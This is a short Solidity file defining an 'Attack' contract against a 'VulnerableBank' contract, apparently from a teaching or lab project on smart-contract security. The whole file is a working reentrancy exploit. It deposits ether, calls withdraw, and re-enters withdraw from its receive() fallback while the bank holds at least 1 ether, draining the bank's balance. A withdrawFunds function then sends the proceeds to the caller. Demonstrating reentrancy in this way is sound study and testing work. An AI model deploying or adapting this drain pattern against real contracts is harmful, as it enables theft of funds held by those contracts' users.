//SPDX-License-Identifier: MIT

pragma solidity 0.8.28;

import "../src/VulnerableBank.sol";

contract Attack  {
    VulnerableBank vulnerableBank;

   constructor(address vulnerableBankAddress_){

    vulnerableBank = VulnerableBank(vulnerableBankAddress_);

   }

    function testAtack(uint256 amount_) public {

        vulnerableBank.deposit{value: amount_}();
        vulnerableBank.withdraw();

    }

    function withdrawFunds() external {
        (bool success,) = msg.sender.call{value: address(this).balance}("");
        require(success, "Tx Failed");
    }

    receive() external payable {
        if (address(vulnerableBank).balance >= 1 ether) {
            vulnerableBank.withdraw();
        }
    }
}
